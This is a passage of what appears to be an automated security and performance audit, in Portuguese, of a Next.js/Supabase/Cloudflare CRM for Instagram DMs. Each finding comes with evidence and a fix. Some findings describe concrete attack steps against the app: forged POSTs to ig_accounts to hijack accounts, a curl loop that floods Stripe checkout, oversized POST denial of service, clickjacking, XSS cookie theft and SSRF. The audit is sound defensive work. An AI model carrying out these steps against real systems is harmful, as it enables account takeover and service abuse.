**Evidência:** use-inbox-realtime.ts:41-43 `.channel("crm-inbox").on("postgres_changes", { event: "*", schema: "public", table: "messages" }, refresh).on("postgres_changes", { event: "*", ..., table: "conversations" }, refresh)`; :27 `timer = setTimeout(() => router.refresh(), 1000)`; inbox.queries.ts:127 `Promise.all([...8 queries])`; use-pipeline-realtime.ts:34-37 idem para `leads`.

**Recomendação:** Adicionar `filter: "account_id=in.(…ids das contas do usuário…)"` / `account_id=eq.<id>` (e `conversation_id` para a thread aberta) ou um canal por conta para o Realtime descartar cedo; melhor ainda, migrar para Broadcast disparado por trigger no Postgres (`realtime.broadcast_changes`) em canal privado por conta, que escala sem avaliar RLS por evento. No cliente, em vez de `router.refresh()` da página inteira, aplicar o payload do evento ao estado local (append da mensagem, atualização do card) e só refazer a lista/refresh completo em eventos que o cliente não consegue aplicar; aumentar o debounce; eliminar os UPDATEs redundantes em conversations.

### A1-003 [medium] Server actions do CRM não checam acesso (bloqueio/assinatura): a trava fica só no middleware, que ignora rotas públicas
`src/modules/crm/inbox/services/composer.actions.ts:82` · security · ⚠️ não verificado

**O que é:** Todas as server actions do CRM (sendMessage, uploadComposerAttachment, importHistoryStep, moveLeadAction, createNote, applyTagToLead etc.) só conferem posse via RLS (ig_accounts.user_id = auth.uid()). Nenhuma chama hasActiveAccess/accountHasAccess. A regra de assinatura/bloqueio vive apenas em src/middleware.ts, que faz `NextResponse.next()` para /api e para PUBLIC_PATHS (middleware.ts:13) sem avaliar o acesso. Em Next.js uma server action é resolvida pelo id (header Next-Action) independentemente da rota em que o POST chega.

**Como acontece:** Cliente logado com access_grants.kind='block' ou assinatura cancelada (ainda dono das linhas em ig_accounts) pega o id da action no bundle JS e faz POST com header Next-Action para /sistema/privacidade (rota pública). O middleware deixa passar, a action roda, a checagem de posse via RLS passa e ele continua enviando DMs pelo painel, importando histórico (gastando Graph API com o token dele), movendo leads e usando o CRM mesmo sem pagar/bloqueado.

**Evidência:** composer.actions.ts:86-88 só chama ownConversation(); middleware.ts:13 `if (pathname.startsWith("/api") || PUBLIC_PATHS.has(pathname)) return NextResponse.next();`; grep de hasActiveAccess/accountHasAccess não encontra nenhum uso em src/modules/crm.

**Recomendação:** Criar um helper `requireCrmAccess()` (getUser + hasActiveAccess com o client do usuário) e chamá-lo no início de toda server action do módulo (ou dentro de ownedAccountId/ownedConversationId em src/lib/auth/ownership.ts). Opcionalmente, no middleware, avaliar sessão/acesso também em POST com header Next-Action mesmo em rotas públicas.

### A2-016 [medium] Entrada automática no funil faz 3 consultas por DM para descobrir que o lead já existe, e moveLead faz mais 4 antes de inserir
`src/modules/crm/pipeline/server/enroll-lead.ts:21` · optimization · ⚠️ não verificado

**O que é:** Para toda mensagem recebida, `enrollLeadFromCapture` faz ensureDefaultPipeline (1 select), currentLeadOf (1) e, quando é a 1ª DM, firstOpenStage (1) + moveLead → loadStage (pipeline_stages + pipelines = 2) + currentLeadOf de novo (1) + endOfColumnPosition (1) + insert lead + insert evento. `currentLeadOf` filtra por (pipeline_id, conversation_id) sem filtro `closed_at is null`, então o índice único parcial `leads_open_per_pipeline_conversation` não serve; resta `leads_board_idx (pipeline_id, ...)`, que varre todos os leads do funil.

**Como acontece:** Lead já no funil (caso comum: toda DM depois da 1ª) → 2 consultas inúteis por DM; funil com 20k leads → cada currentLeadOf percorre 20k entradas de índice pelo pipeline_id.

**Evidência:** enroll-lead.ts:21-27 `ensureDefaultPipeline` → `currentLeadOf` → `firstOpenStage`; move-lead.ts:61-75 `.eq("pipeline_id", pipelineId).eq("conversation_id", conversationId).order("created_at")`.

**Recomendação:** Criar índice `leads (pipeline_id, conversation_id, created_at desc)`; mover a verificação para uma única consulta (ex.: `conversations.contact_id`/flag `enrolled` ou RPC `enroll_if_missing`), e só rodar o enroll quando a mensagem for a 1ª da conversa (já sabe-se pelo resultado do upsert).

### A3-013 [medium] 'Trazer conversas existentes' carrega todas as conversas da conta (teto de 1000) e chama moveLead uma a uma (~6 consultas por conversa) dentro de uma server action
`src/modules/crm/pipeline/server/enroll-lead.ts:61` · optimization · ⚠️ não verificado

**O que é:** `enrollExistingConversations` seleciona todas as conversas e todos os leads do funil sem paginação (PostgREST corta em 1000 — a confirmar — então contas com mais conversas nunca inscrevem o restante) e, para cada pendente, chama `moveLead`, que faz loadStage (2 consultas) + currentLeadOf + endOfColumnPosition + insert lead + insert evento. Tudo em série numa única requisição de server action no Worker.

**Como acontece:** 1.000 conversas pendentes → ~6.000 consultas sequenciais (~3–5 min a 40 ms cada) numa única invocação; o Worker/cliente pode abortar antes do fim e as demais ficam de fora.

**Evidência:** enroll-lead.ts:52-69: `admin.from("conversations").select("id, ig_sender_id").eq("account_id", accountId)` ... `for (const conversation of pending) { const result = await moveLead(...) }`.

**Recomendação:** Fazer a inscrição em lote no banco (um `insert into leads ... select from conversations where not exists (...)` + insert dos eventos) via RPC, ou processar em lotes paginados com cursor devolvido à UI, como já faz a importação de histórico.

### A3-012 [medium] getBoard carrega stage_id+value de TODOS os leads do funil para contar/somar em JS (truncado em 1000) e faz 1 consulta por etapa
`src/modules/crm/pipeline/services/pipeline.queries.ts:112` · bug · ⚠️ não verificado

**O que é:** `leads.select("stage_id, value").eq("pipeline_id", ...)` sem limite: o PostgREST devolve no máximo `max_rows` (padrão 1000, a confirmar), então o contador e a soma de valor por coluna ficam errados em funis com mais de 1000 leads, e a página transfere 1000 linhas por render (inclusive a cada evento realtime de `leads`). Em seguida `Promise.all(stages.map(...))` dispara 1 consulta por etapa.

**Como acontece:** Funil com 2.500 leads → cabeçalho das colunas mostra contagens que somam 1.000; cada drag de card (realtime) refaz tudo.

**Evidência:** pipeline.queries.ts:112: `const { data: statRows } = await supabase.from("leads").select("stage_id, value").eq("pipeline_id", pipelineId);` e 121-135 `Promise.all(stages.map(async (stage) => { ... }))`.

**Recomendação:** RPC `select stage_id, count(*), coalesce(sum(value),0) from leads where pipeline_id = $1 group by stage_id`; para os cards, uma consulta com window function (`row_number() over (partition by stage_id order by position)` ≤ 51) ou manter N consultas mas só das etapas visíveis.

### A2-019 [medium] Filtro por tag no Inbox varre todos os contatos com tag em páginas de 1000 e filtra em JS, ignorando o índice GIN existente
`src/modules/crm/tags/server/tagged-contacts.ts:31` · optimization · ⚠️ não verificado

**O que é:** `findContactsWithTag` pagina `contacts where tags <> '{}' order by id limit 1000` e compara `sameTag` em JS para achar quem tem a tag. É usado em toda renderização do Inbox com `?tag=` (listConversations → listSenderIdsWithTag) e nas ações de renomear/excluir tag. A migration 0012:59 cria `contacts_tags_gin_idx` (GIN em tags), que permitiria `tags @> '{nome}'`, mas a busca não o usa por causa da comparação sem acento/maiúscula. Além disso o resultado vira um `.in("ig_sender_id", senderIds)` com potencialmente milhares de ids na URL.

**Como acontece:** Conta com 30.000 contatos etiquetados → cada render do Inbox filtrado por tag faz 30 consultas sequenciais de 1000 linhas (~2–3 s) e monta um `in()` gigante; realtime refaz isso a cada evento.

**Evidência:** tagged-contacts.ts:31-50: `for (;;) { ... .select("id, account_id, ig_sender_id, tags").neq("tags", "{}").order("id").limit(PAGE) ... if (tags.some((t) => sameTag(t, tagName))) ...`

**Recomendação:** Normalizar a tag na gravação (coluna `tags_normalized text[]` ou sempre gravar a grafia canônica do catálogo) e consultar com `contains`/`@>` usando o índice GIN; no Inbox, fazer o filtro por tag num join/`in (select ...)` no banco em vez de carregar ids para o Worker.

### A1-009 [medium] sequence_runs sem índice para as consultas de recoverStaleRuns (status='running') e da ficha do Inbox: seq scan a cada minuto e em cada webhook
`supabase/migrations/0001_init.sql:149` · optimization · ⚠️ não verificado

**O que é:** Os únicos índices de sequence_runs são: unique (sequence_id, ig_sender_id), `sequence_runs_due_idx (next_run_at) where status='waiting_delay'` e `sequence_runs_waiting_idx (account_id, ig_sender_id) where status in ('waiting_reply','waiting_postback')`. Duas consultas quentes não casam com nenhum deles: (1) `recoverStaleRuns` (src/lib/sequences/runtime.ts:778-784) filtra `status = 'running' and updated_at < cutoff order by updated_at` e roda no início de TODO `processDueRuns`, que é chamado pelo cron a cada minuto (api/cron/sequences) e ao fim de cada invocação do webhook da Meta (process.ts:187 → processDueRunsSafe). (2) `getThread` do Inbox (src/modules/crm/inbox/services/inbox.queries.ts:141-147) filtra `account_id, ig_sender_id, status in ('running','waiting_reply','waiting_postback','waiting_delay')`: o predicado IN com 4 status não é implicado pelo índice parcial de 2 status, então o planner não pode usá-lo. A tabela só cresce (runs completed/error nunca são apagados), então o custo vira um seq scan por minuto + por webhook + por conversa aberta.

**Como acontece:** Com dezenas de milhares de execuções acumuladas, cada tick do cron e cada POST do webhook pagam uma varredura completa de sequence_runs antes de processar qualquer coisa, somando latência ao webhook (que tem orçamento de tempo no Worker) e CPU no Postgres; abrir uma conversa no Inbox faz outra varredura.

**Evidência:** runtime.ts:778-784 `.from("sequence_runs").select("*, sequences(name)").eq("status", "running").lt("updated_at", cutoff).order("updated_at").limit(limit)`; índices em 0001_init.sql:149-153 cobrem só waiting_delay / waiting_reply / waiting_postback.

**Recomendação:** Criar `create index sequence_runs_running_updated_idx on public.sequence_runs (updated_at) where status = 'running';` e um índice geral `(account_id, ig_sender_id)` (ou parcial `where status in ('running','waiting_reply','waiting_postback','waiting_delay')`) para a ficha do Inbox. Opcionalmente, arquivar/apagar runs completed/error antigos no cron de purge.

### A1-008 [medium] Aplicação da migration 0022 (ig_accounts somente leitura) não é verificada por nenhuma checagem automática; sem ela, qualquer usuário logado escreve token/status/ig_user_id direto pela API
`supabase/migrations/0022_ig_accounts_select_only.sql:18` · config · ⚠️ não verificado

**O que é:** A 0001 criou a policy "own accounts" como `for all` (0001_init.sql:195-196): com ela, qualquer usuário autenticado pode fazer insert/update/delete em ig_accounts via PostgREST (chave anon + JWT dele), inclusive gravar access_token_enc arbitrário, trocar status para 'active' e cadastrar o ig_user_id de outro cliente. A 0022 corrige isso trocando para select-only, mas por desenho ela só pode ser aplicada DEPOIS do deploy (comentário na própria migration e em scripts/check-db-schema.mjs:61, que manda aplicar 'até a 0021; a 0022 só depois do deploy'). O check de schema do build (check-db-schema.mjs) usa a service role e só confere colunas: não detecta policy errada. A única verificação é o script manual scripts/check-tenant-isolation.mjs. Se a 0022 for esquecida (ou o banco for recriado a partir da 0001 e o passo pós-deploy pular), o estado fica silenciosamente inseguro. A confirmar na configuração do projeto Supabase de produção (pg_policies de ig_accounts).

**Como acontece:** Cliente logado (mesmo bloqueado ou sem assinatura, já que /api não passa pelo middleware e o RLS só olha auth.uid()) chama `POST /rest/v1/ig_accounts` com `{user_id: <ele>, ig_user_id: '<id do @ de outro cliente desconectado/expirado>', status: 'active', access_token_enc: 'x'}`. Se o @ alvo não tem linha ativa, o índice único parcial aceita, e findServedAccount passa a rotear os webhooks desse @ para a conta falsa (ou o atacante 'reserva' o @ antes do dono conectar). Também pode fazer `PATCH ig_accounts?id=eq.<sua conta>` com status='active' em conta expirada, ou sobrescrever o token cifrado.

**Evidência:** 0001_init.sql:195-196 `create policy "own accounts" on public.ig_accounts for all using (user_id = auth.uid()) with check (user_id = auth.uid());` — 0022 só faz `drop policy ... create policy "own accounts select" for select`. check-db-schema.mjs:13-32 só lista colunas; nenhuma linha confere policies.

**Recomendação:** Tornar a conferência automática: no check-db-schema.mjs (ou num novo `check:rls`), consultar `pg_policies` (via RPC security definer restrita ao service_role, ou SQL direto) e falhar o build se existir policy com cmd ALL/INSERT/UPDATE/DELETE em ig_accounts para authenticated, ou se faltar RLS habilitado em qualquer tabela de public. Alternativamente, fundir a 0022 no fluxo normal de migrations agora que o código já grava ig_accounts só pela service role, e registrar em docs/operacao-saas.md a verificação em produção.

### A2-006 [medium] Workers Logs (invocation logs) gravam URLs com token_hash de convite/recuperação de senha e code do OAuth
`wrangler.toml:33` · config · ⚠️ não verificado

**O que é:** `[observability] enabled = true` liga os Workers Logs, que por padrão registram um invocation log por requisição com a URL completa (inclusive query string). As URLs sensíveis deste app: `/sistema/definir-senha?token_hash=...&type=invite|recovery` (link de e-mail do Supabase, válido até ser usado ou expirar) e `/sistema/api/auth/meta/callback?code=...&state=...` (code de uso único, trocado na hora). O token_hash é o mais grave: um link de convite ainda não aberto pelo cliente dá a quem o lê a chance de definir a senha e tomar a conta. Que o invocation log inclua a URL inteira é a confirmar no painel (Observability → Logs → campo request.url).

**Como acontece:** Pessoa com acesso de leitura aos logs da conta Cloudflare (membro da conta, token de API com Logs:Read, ou atacante com a conta comprometida) filtra por 'definir-senha?token_hash=', abre o link antes do cliente, define a senha e entra no painel do cliente (acesso à inbox, leads, conta do Instagram conectada). Retenção padrão dos Workers Logs é de dias, então a janela cobre convites recém-enviados pela compra na Stripe.

**Evidência:** wrangler.toml:32-33 `[observability]\nenabled = true`; docs/operacao-saas.md:435 e 447 montam os links com `?token_hash={{ .TokenHash }}&type=...`

**Recomendação:** Desligar o invocation log (`[observability.logs] invocation_logs = false`, mantendo os console.* com `enabled = true`), ou mover o token para o fragmento da URL (#token_hash=...) e lê-lo no client antes de chamar o verifyOtp, de modo que nunca chegue ao servidor/log. Para o OAuth, o code é descartável, mas vale o mesmo cuidado. Confirmar no painel se o campo request.url aparece nos logs e, se sim, apagar/limitar a retenção.

### A0-025 [low] NEXT_PUBLIC_APP_URL e URL do webhook da Stripe documentadas sem o /sistema no README e no .env.example, mas o código exige o /sistema (quebra pós-compra, convite, OAuth e crons)
`.env.example:32` · config · ✅ confirmado (3 lentes)

**O que é:** README.md:79 diz `https://falow.app.br` em produção, .env.example:30-32 sugere o mesmo e .env.example:49 documenta o endpoint do webhook da Stripe como `https://falow.app.br/api/webhooks/stripe`, enquanto src/lib/app-url.ts:11-17, src/lib/auth/invite.ts:15, src/app/login/actions.ts:43, src/lib/admin/access-email.ts:23 e src/lib/cron/schedule.ts:12,26 concatenam caminhos direto nessa variável e assumem que ela já termina em /sistema (docs/operacao-saas.md:478,528 dizem isso corretamente). Com o valor do exemplo: success_url e cancel_url do Checkout vão para a landing (404), o `redirectTo` do convite e da recuperação de senha aponta para `https://falow.app.br/definir-senha` fora do app (landing, 404 — e o Supabase recusa o redirectTo fora da allow-list), o OAuth da Meta redireciona para /login e /accounts na landing, e `cronRequestFor`/`scheduled()` montam `https://falow.app.br/api/cron/purge` e `/api/cron/sequences`, que o handler do OpenNext (basePath /sistema) responde 404: o purge e as sequências com atraso nunca rodam (só aparece no log como `[cron] /api/cron/sequences -> 404`). Um endpoint de webhook da Stripe cadastrado sem /sistema cai na landing e nenhuma assinatura é registrada. Não há validação das variáveis obrigatórias na inicialização: `appUrl()` usa `!` e lança TypeError se a variável faltar no build, e invite.ts/access-email.ts produzem 'undefined/definir-senha' silenciosamente.

**Como acontece:** Operador copia o .env.example (ou segue o README) para configurar os secrets do Worker ou o endpoint na Stripe → eventos da Stripe batem na landing (404), e-mails de convite/recuperação apontam para fora do app, OAuth da Meta volta para a landing e crons disparam contra uma URL que o Worker não atende.

**Evidência:** README.md:79 `| NEXT_PUBLIC_APP_URL | URL pública do serviço | https://falow.app.br em produção ...`; .env.example:32 `# NEXT_PUBLIC_APP_URL=https://falow.app.br`; .env.example:49 `# https://falow.app.br/api/webhooks/stripe → Signing secret`; src/lib/app-url.ts:12 comentário 'NEXT_PUBLIC_APP_URL já inclui o /sistema'; src/lib/cron/schedule.ts:26-27 `${base}${path}`.

**Recomendação:** Corrigir README e .env.example para `https://falow.app.br/sistema` em todas as menções (variável e endpoint do webhook) e acrescentar uma validação única (ex.: src/lib/env.ts com zod, ou um check de deploy) que falhe o build/primeira requisição se NEXT_PUBLIC_APP_URL não terminar em BASE_PATH (/sistema) ou se alguma variável obrigatória estiver vazia, em vez de `!` espalhado.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-005 [low] Nenhum cabeçalho de segurança (CSP, frame-ancestors, HSTS, nosniff, Referrer-Policy) e cookie de sessão legível por JavaScript
`next.config.mjs:2` · security · ✅ confirmado (3 lentes)

**O que é:** next.config.mjs não define `headers()` nem `poweredByHeader: false`, e nenhum lugar do app (middleware, layouts) injeta cabeçalhos. O painel, o /admin e o login podem ser carregados dentro de um iframe de terceiros (sem X-Frame-Options/frame-ancestors), não há Content-Security-Policy e o Referrer-Policy fica no padrão do navegador. Isso pesa mais aqui porque o @supabase/ssr grava a sessão (access + refresh token) em cookies com `httpOnly: false` por design (node_modules/@supabase/ssr/dist/main/utils/constants.js:4-10), e o client do navegador (src/lib/supabase/client.ts) depende disso: qualquer XSS no painel lê o cookie e vira sessão completa, inclusive trocando a senha pela action setPassword sem senha atual.

**Como acontece:** 1) Clickjacking: site malicioso abre https://falow.app.br/sistema/admin/clientes num iframe transparente sobre botões falsos e induz o admin logado a clicar em 'Bloquear'/'Dar cortesia' (as actions do admin são submits de formulário). 2) Qualquer XSS futuro (ex.: conteúdo de DM/nome de lead renderizado sem escape em algum componente) rouba `sb-*-auth-token` por `document.cookie` e usa o refresh token por até 400 dias; a CSP limitaria o exfil. Cabeçalhos via Cloudflare (Transform Rules, HSTS em SSL/TLS → Edge Certificates) são 'a confirmar na configuração'.

**Evidência:** next.config.mjs:2-18 (sem `headers`, sem `poweredByHeader`); @supabase/ssr constants.js `httpOnly: false, maxAge: 400 * 24 * 60 * 60`, sem `secure`; grep por 'Content-Security-Policy|X-Frame-Options|Strict-Transport' em src e next.config.mjs sem resultado.

**Recomendação:** Adicionar `headers()` no next.config.mjs (ou no middleware) com `Content-Security-Policy` (frame-ancestors 'none'; connect-src limitado ao Supabase, Stripe e à própria origem; img-src para *.cdninstagram.com/*.fbcdn.net), `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: strict-origin-when-cross-origin`, `Permissions-Policy` e `poweredByHeader: false`. Na Cloudflare, ativar HSTS (com preload depois de validar a landing) e 'Always Use HTTPS'. Avaliar a mudança de Realtime para um canal servido pelo servidor, permitindo cookies httpOnly no futuro.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-030 [low] bodySizeLimit de 26 MB vale para todas as server actions, inclusive as anônimas do login
`next.config.mjs:9` · security · ✅ confirmado (3 lentes)

**O que é:** `experimental.serverActions.bodySizeLimit: '26mb'` é global: o Next aceita corpos de até 26 MB em qualquer action, inclusive signIn/requestPasswordReset (sem login) e setPassword (público). O limite existe para o anexo do composer do CRM, mas acaba valendo no ponto mais exposto do app. Combinado com os advisories de DoS em Server Actions do Next 14 (achado A0-001) e com o limite de 128 MB de memória do Worker, vira um amplificador barato.

**Como acontece:** Atacante anônimo envia POSTs de 26 MB para a action signIn em /sistema/login em paralelo; o Worker precisa ler e desserializar cada corpo antes de o zod recusar, consumindo memória/CPU do mesmo Worker que atende webhooks da Meta e Stripe.

**Evidência:** next.config.mjs:9 `serverActions: { bodySizeLimit: "26mb" }`; src/app/login/actions.ts:18-35 action pública que lê FormData.

**Recomendação:** Manter o limite alto só onde é preciso: mover o upload do anexo para um Route Handler (/api/crm/upload) com checagem de sessão e limite próprio, ou para upload direto ao Storage com URL assinada, e baixar bodySizeLimit para o padrão (1 MB). Na Cloudflare, regra de WAF limitando `http.request.body.size` para POST fora de /sistema/api/crm/upload.

**Verificação:** refute: confirmed (low) / exploit: refuted (info) / impact: confirmed (low)

### A0-003 [low] @opennextjs/cloudflare 1.14.10 tem dois advisories high (SSRF via /cdn-cgi/image e bypass do middleware por caminhos codificados)
`package.json:50` · security · ✅ confirmado (3 lentes)

**O que é:** `npm audit` aponta GHSA-c7mq-gh6q-6q7c (SSRF por bypass de normalização do caminho /cdn-cgi/, corrigido em 1.17.1) e GHSA-2vc4-c4r6-p6v6 (interceptação de cache ignora a proteção do middleware para caminhos codificados, corrigido em 1.20.2). O template do Worker instalado (node_modules/@opennextjs/cloudflare/dist/cli/templates/worker.js:25-34) faz `fetch(imageUrl, { cf: { cacheEverything: true } })` para qualquer URL http(s) extraída de `/cdn-cgi/image/<opts>/<url>`, confiando que esse caminho nunca chega ao Worker em produção; o advisory existe justamente porque uma forma de caminho normalizado diferente chegava. O segundo advisory depende de `enableCacheInterception`, que aqui fica no padrão false (open-next.config.ts usa defineCloudflareConfig() sem opções), então não se aplica hoje, mas passa a valer se alguém ligar o cache.

**Como acontece:** Atacante anônimo monta uma URL sob /sistema (rota do Worker) que, após a normalização que a Cloudflare aplica para roteamento mas não para o Worker, chega ao template como `/cdn-cgi/image/x/https://alvo` → o Worker busca a URL arbitrária com `cacheEverything` e devolve o corpo: proxy aberto saindo dos IPs da Cloudflare, útil para esconder origem de ataques a terceiros ou para consultar serviços que confiam em egress da Cloudflare. A confirmar na configuração: depende das opções de normalização de URL da zona (Rules → Settings) e de como a rota `falow.app.br/sistema/*` é casada.

**Evidência:** package.json:50 `"@opennextjs/cloudflare": "^1.14.10"`; node_modules/@opennextjs/cloudflare/package.json 1.14.10; worker.js:25 `if (url.pathname.startsWith("/cdn-cgi/image/"))` … :32 `fetch(imageUrl, { cf: { cacheEverything: true } })`; api/config.js:9 `enableCacheInterception = false`.

**Recomendação:** Atualizar @opennextjs/cloudflare para ≥ 1.20.2 e refazer o build/deploy (o template do Worker é gerado no build, então o patch só entra com `npm run deploy:cloudflare`). Manter `enableCacheInterception` desligado até estar na versão corrigida.

**Verificação:** refute: confirmed (low) / exploit: confirmed (medium) / impact: confirmed (low)

### A0-006 [low] Registro de auditoria (admin_audit_log) não é imutável: o próprio código faz UPDATE e nada no banco impede UPDATE/DELETE
`src/app/admin/actions.ts:124` · security · ✅ confirmado (3 lentes)

**O que é:** A tabela admin_audit_log tem RLS sem policy (migration 0021, linhas 41-42), o que só barra anon/authenticated. O service role (usado em 29 arquivos do projeto: CRM, webhooks, crons) tem todos os privilégios e o fluxo de convite já depende disso: inviteWithCourtesyAction insere a linha 'requested' e depois a sobrescreve com UPDATE (linha 124). Não há trigger que proíba UPDATE/DELETE, nem REVOKE desses privilégios, nem coluna de hash/encadeamento. O registro que deveria provar o que cada admin fez pode ser reescrito ou apagado sem rastro.

**Como acontece:** Qualquer código que roda com SUPABASE_SERVICE_ROLE_KEY (ou um vazamento dessa chave, ou um admin com acesso ao SQL Editor do Supabase) executa `update admin_audit_log set admin_id = ... / delete from admin_audit_log where target_user_id = ...` e apaga ou reatribui bloqueios, cortesias e convites. Um admin malicioso que obtenha a chave (ela está nos secrets do Worker) elimina as próprias ações do registro.

**Evidência:** actions.ts:124 `await admin.from("admin_audit_log").update({ target_user_id: targetUserId, details: {...} }).eq("id", auditId!)`; 0021_admin_access_grants.sql:41-42 `alter table public.admin_audit_log enable row level security; -- sem policy: só service role` (sem trigger nem revoke).

**Recomendação:** Tornar a tabela append-only: trigger `before update or delete on admin_audit_log for each row execute function raise_exception()` (o service role não ignora triggers) e, opcionalmente, `revoke update, delete on public.admin_audit_log from service_role`. Reestruturar inviteWithCourtesyAction para gravar dois INSERTs (courtesy_invite 'requested' e depois 'created'/'existing' referenciando o id do primeiro em details) em vez de UPDATE. Considerar coluna `prev_hash` para encadear entradas.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-013 [low] Página Registro faz até ~51 chamadas HTTP ao GoTrue por render (N+1 em getUserById)
`src/app/admin/page.tsx:63` · optimization · ✅ confirmado (3 lentes)

**O que é:** Para 50 linhas de auditoria a página resolve o e-mail de admin_id e target_user_id com `admin.auth.admin.getUserById` por UUID único. Com clientes distintos em cada linha são até 50 alvos + N admins = 51+ subrequests paralelos a https://<projeto>.supabase.co/auth/v1/admin/users/<id> a cada abertura da aba. No Cloudflare Workers o limite de subrequests por requisição é 50 no plano Free e 1000 no Paid (a confirmar no plano contratado): no Free, parte das chamadas falha, o `.then(..., () => null)` engole o erro e a tabela passa a mostrar UUIDs em vez de e-mails. Mesmo no Paid é latência e custo desnecessários numa página de uso frequente.

**Como acontece:** Admin abre /admin → 1 query PostgREST + até 51 GETs ao Auth Admin API em paralelo → render lento; no plano Free, erro 'Too many subrequests' silenciado e colunas Admin/Cliente degradam para UUID.

**Evidência:** page.tsx:57-73: `const emails = new Map<string, Promise<string | null>>(); const emailOf = (id) => { ... admin.auth.admin.getUserById(id).then(({ data: found }) => found?.user?.email ?? null, () => null) ... }; const rows = await Promise.all(entries.map(async (e) => ({ ...e, adminEmail: await emailOf(e.admin_id), targetEmail: await emailOf(e.target_user_id) })));`

**Recomendação:** Gravar admin_email/target_email no `details` no momento da auditoria (os dados já estão em mãos nas actions), ou resolver os e-mails numa única consulta: função SQL security definer restrita ao service_role (`select id, email from auth.users where id = any($1)`) chamada uma vez com todos os UUIDs. Limitar a página a 50 continua ok.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-020 [low] POST /api/billing/checkout sem autenticação nem limite cria sessões de Checkout ilimitadas na Stripe
`src/app/api/billing/checkout/route.ts:36` · security · ✅ confirmado (3 lentes)

**O que é:** A rota aceita POST anônimo (por design, botão da landing) e cria uma Checkout Session por requisição, sem rate limit no app. Um script pode criar milhares de sessões: consome a cota de API da Stripe da conta (compartilhada com o `subscriptions.retrieve` do webhook, que passa a falhar e responder 500), polui o dashboard e pode disparar alertas antifraude da Stripe. Cookies do Supabase são SameSite=Lax (padrão do @supabase/ssr), então CSRF cross-site não carrega a sessão; só a landing na raiz do mesmo domínio (outro repositório, same-site) conseguiria postar com cookies. Rate limit na Cloudflare: a confirmar na configuração.

**Como acontece:** curl -X POST https://falow.app.br/sistema/api/billing/checkout em loop → cada chamada = 1 checkout.sessions.create com STRIPE_SECRET_KEY.

**Evidência:** export async function POST() { ... const session = await getStripe().checkout.sessions.create({ mode: "subscription", ... }); return NextResponse.redirect(session.url!, 303);

**Recomendação:** Criar uma regra de Rate Limiting na Cloudflare para `/sistema/api/billing/*` (ex.: 5 req/min por IP) e, no app, exigir Turnstile ou ao menos um token de origem no formulário da landing. Verificar o header Origin/Referer contra falow.app.br na rota. Considerar reutilizar a sessão de Checkout aberta por cliente logado em vez de criar uma nova a cada clique.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-024 [low] Rota de purge exposta na internet com comparação de segredo não constante
`src/app/api/cron/purge/route.ts:14` · config · ✅ confirmado (3 lentes)

**O que é:** O cron é disparado internamente por `handler.fetch` no `scheduled()` do worker.ts, mas a rota GET /sistema/api/cron/purge também responde a qualquer requisição externa. A autenticação usa `!==` em string (não é constant-time) e a resposta 503 revela quando o CRON_SECRET não está configurado. O risco prático de timing pela rede da Cloudflare é baixo, mas a rota apaga usuários e arquivos de forma irreversível: não há motivo para ser alcançável de fora.

**Como acontece:** Atacante com o CRON_SECRET (vazado em log/.env embutido no build, ver seção 4.4 do runbook) chama GET /sistema/api/cron/purge e dispara exclusões; sem o segredo, pode ao menos sondar a existência da rota.

**Evidência:** if (request.headers.get("authorization") !== `Bearer ${secret}`) { return new NextResponse("Forbidden", { status: 403 }); }

**Recomendação:** Bloquear `/sistema/api/cron/*` com uma regra de WAF da Cloudflare (a chamada interna via handler.fetch não passa pelo WAF, a confirmar na configuração), ou marcar a requisição interna com um header só conhecido pelo worker.ts. Usar `crypto.timingSafeEqual` (ou comparar hashes) para o segredo e responder 403 genérico também quando o secret não existe.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-031 [low] CRON_SECRET aceito na query string de /api/cron/sequences com Workers Logs ligado
`src/app/api/cron/sequences/route.ts:29` · config · ✅ confirmado (3 lentes)

**O que é:** A rota (fora do middleware, como todo /api) aceita `?secret=<CRON_SECRET>` além do header, para agendadores externos. Com `[observability] enabled = true` no wrangler.toml, a Cloudflare registra a URL de cada requisição (inclusive query) nos Workers Logs, então qualquer uso do formato por query grava o segredo nos logs, acessíveis a quem tiver leitura no painel da conta. O purge (purge/route.ts:10-16) já é só por header, o que mostra a intenção.

**Como acontece:** Operador configura um cron-job.org com `?secret=`; o segredo passa a aparecer em cada linha de log do Worker e no histórico do agendador; quem lê os logs (membro da conta Cloudflare com papel de leitura, ou vazamento de export) dispara /api/cron/sequences e /api/cron/purge à vontade (o purge apaga usuários e arquivos).

**Evidência:** src/app/api/cron/sequences/route.ts:29-30 `const bySecret = request.nextUrl.searchParams.get("secret"); if (auth !== \`Bearer ${secret}\` && bySecret !== secret)`; wrangler.toml:32-33 `[observability] enabled = true`.

**Recomendação:** Remover a aceitação por query (o scheduled() do Worker já manda o header) ou, se um agendador externo for mesmo necessário, usar um segredo separado e rotacionável só para ele; no mínimo, documentar que a forma por query grava o segredo nos logs.

**Verificação:** refute: confirmed (low) / exploit: confirmed (low) / impact: confirmed (low)

### A0-018 [low] GET de verificação aceita qualquer requisição se META_VERIFY_TOKEN estiver vazio
`src/app/api/webhooks/meta/route.ts:19` · config · ✅ confirmado (3 lentes)

**O que é:** A comparação é `params.get("hub.verify_token") === process.env.META_VERIFY_TOKEN`. Com a variável ausente, `null === undefined` é false (ok). Mas com a variável definida como string vazia (secret criado em branco no painel do Cloudflare, ou `echo "" | wrangler secret put`), uma requisição `?hub.mode=subscribe&hub.verify_token=&hub.challenge=X` passa e devolve o desafio. As rotas de cron já têm a guarda `if (!secret) return 503`; esta não tem.

**Como acontece:** Operador cria o secret `META_VERIFY_TOKEN` vazio por engano. Qualquer terceiro consegue completar a verificação de webhook da Meta apontando o próprio app para `falow.app.br/sistema/api/webhooks/meta`. O impacto direto é baixo (os POSTs desse app falhariam na assinatura), mas a verificação deixa de ser uma barreira.

**Evidência:** route.ts l.17-22: sem checagem de `process.env.META_VERIFY_TOKEN` vazio/ausente antes de comparar.

**Recomendação:** Guardar o valor em constante, recusar com 503 quando vazio/ausente (como em `api/cron/*`), e comparar com `timingSafeEqual` por consistência.

